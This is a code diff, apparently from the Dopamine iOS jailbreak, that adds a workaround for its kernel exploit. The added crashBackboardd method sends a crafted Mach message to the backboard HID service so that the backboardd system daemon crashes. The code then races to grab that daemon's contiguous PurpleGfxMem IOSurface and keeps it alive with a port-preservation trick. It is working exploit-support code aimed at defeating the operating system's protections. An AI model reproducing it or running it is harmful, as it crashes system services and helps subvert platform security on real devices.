@@ -35,6 +35,8 @@
 #import <CoreServices/LSApplicationProxy.h>
 #import <sys/utsname.h>
 #import "spawn.h"
+#import "clock_alarm.h"
+#import <IOSurface/IOSurfaceRef.h>
 int posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count);
 
 #define kCFPreferencesNoContainer CFSTR("kCFPreferencesNoContainer")
@@ -661,6 +663,129 @@ void *boomerang_server(struct boomerang_info *info)
 {
     [[DOUIManager sharedInstance] sendLog:DOLocalizedString(@"Rebooting Userspace") debug:NO];
     [[DOEnvironmentManager sharedManager] rebootUserspace];
+}
+
+- (IOSurfaceRef)allocatePurpleGfxMemWithSize:(size_t)size
+{
+    NSDictionary *surfaceProperties = @{
+        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
+        @"IOSurfaceAllocSize" : @(size),
+    };
+    return IOSurfaceCreate((__bridge CFDictionaryRef)surfaceProperties);
+}
+
+- (BOOL)surfaceIsContiguous:(IOSurfaceRef)surface
+{
+    vm_address_t mem_addr = (vm_address_t)IOSurfaceGetBaseAddress(surface);
+    vm_size_t mem_size = (vm_size_t)IOSurfaceGetAllocSize(surface);
+    vm_region_submap_short_info_data_64_t info = {0};
+    uint32_t count = VM_REGION_SUBMAP_SHORT_INFO_COUNT_64;
+    natural_t depth = 9999999;
+    
+    kern_return_t kr = vm_region_recurse_64(mach_task_self(), &mem_addr, &mem_size, &depth, (vm_region_recurse_info_t)&info, &count);
+    return (kr == 0 && info.share_mode == SM_EMPTY && info.object_id != 0);
+}
+
+- (BOOL)contiguousMappingWorks
+{
+    IOSurfaceRef surface = [self allocatePurpleGfxMemWithSize:0x8000];
+    if (surface == NULL) return false;
+    
+    BOOL contiguous = [self surfaceIsContiguous:surface];
+    CFRelease(surface);
+    return contiguous;
+}
+
+- (BOOL)contiguousMappingWorkaroundNeeded
+{
+    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
+    if ([kernelExploit hasRequirement:@"contiguousMapping"]) {
+        return ![self contiguousMappingWorks];
+    }
+    return NO;
+}
+
+- (int)crashBackboardd
+{
+#pragma pack(push, 4)
+    typedef struct {
+        mach_msg_header_t header;
+        mach_msg_body_t body;
+        mach_msg_ool_descriptor_t archive;
+        NDR_record_t ndr;
+        mach_msg_type_number_t archiveLength;
+    } Request;
+#pragma pack(pop)
+    
+    kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);
+    
+    NSData *archive =
+        [NSKeyedArchiver archivedDataWithRootObject:@[ @[] ]
+                              requiringSecureCoding:YES
+                                              error:nil];
+    mach_port_t bootstrap = MACH_PORT_NULL;
+    mach_port_t service = MACH_PORT_NULL;
+
+    if (!archive ||
+        task_get_bootstrap_port(mach_task_self(), &bootstrap) != KERN_SUCCESS ||
+        bootstrap_look_up(bootstrap, "com.apple.backboard.hid.services", &service) != KERN_SUCCESS) {
+        return -1;
+    }
+
+    Request request = {0};
+    request.header.msgh_bits =
+        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    request.header.msgh_size = sizeof(request);
+    request.header.msgh_remote_port = service;
+    request.header.msgh_id = 6000032;   // kPostTouchAnnotationsMessageID
+    request.body.msgh_descriptor_count = 1;
+    request.archive.address = (void *)archive.bytes;
+    request.archive.size = (mach_msg_size_t)archive.length;
+    request.archive.copy = MACH_MSG_VIRTUAL_COPY;
+    request.archive.type = MACH_MSG_OOL_DESCRIPTOR;
+    request.ndr = NDR_record;
+    request.archiveLength = (mach_msg_type_number_t)archive.length;
+
+    (void)mach_msg(&request.header,
+                   MACH_SEND_MSG | MACH_SEND_TIMEOUT,
+                   request.header.msgh_size,
+                   0,
+                   MACH_PORT_NULL,
+                   1000,
+                   MACH_PORT_NULL);
+    
+    mach_port_deallocate(mach_task_self(), service);
+    return 0;
+}
+
+- (void)applyContiguousMappingWorkaround
+{
+    [self crashBackboardd];
+    
+    // After backboardd has crashed, we have about 200ms until the new backboardd kills our app
+    // In this timeframe we need to steal it's contiguous PurpleGfxMem allocation
+    IOSurfaceRef surface = NULL;
+    do {
+        if (surface) {
+            CFRelease(surface);
+            surface = NULL;
+            usleep(50);
+        }
+        surface = [self allocatePurpleGfxMemWithSize:0x8000];
+    }
+    while (![self surfaceIsContiguous:surface]);
+    
+    printf("Got contiguous mapping surface %p\n", surface);
+    
+    // We keep the surface alive for another 20 seconds
+    // This persists our process being killed
+    // Once it is freed, the next Dopamine can regain the contiguous mapping
+    mach_port_t surfacePort = IOSurfaceCreateMachPort(surface);
+    kern_return_t kr = clock_alarm_preserve_port(surfacePort, 20);
+    mach_port_mod_refs(mach_task_self(), surfacePort, MACH_PORT_RIGHT_SEND, -1);
+    CFRelease(surface);
+    
+    printf("preserved port? %d\n", kr);
 }
 
 @end
